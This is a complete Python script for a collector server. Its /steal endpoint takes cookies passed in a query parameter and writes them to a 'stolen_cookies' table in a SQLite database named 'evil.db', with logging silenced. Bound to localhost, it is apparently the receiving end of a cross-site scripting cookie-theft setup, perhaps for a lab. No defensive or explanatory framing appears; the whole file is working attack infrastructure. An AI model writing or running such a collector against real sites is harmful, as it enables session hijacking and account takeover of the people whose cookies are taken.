#!/usr/bin/env python3
import sqlite3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime

DB_PATH = "evil.db"
HOST = "127.0.0.1"
PORT = 9090

CREATE_SQL = """
CREATE TABLE IF NOT EXISTS stolen_cookies (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  cookie TEXT NOT NULL,
  received_at TEXT NOT NULL
)
"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/steal":
            params = parse_qs(parsed.query)
            cookie = params.get("c", [""])[0]
            if cookie:
                with sqlite3.connect(DB_PATH) as conn:
                    conn.execute(CREATE_SQL)
                    conn.execute(
                        "INSERT INTO stolen_cookies(cookie, received_at) VALUES(?, ?)",
                        (cookie, datetime.utcnow().isoformat())
                    )
                    conn.commit()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")
            return

        self.send_response(404)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"not found")

    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), Handler)
    print(f"[evil] listening on http://{HOST}:{PORT}")
    server.serve_forever()
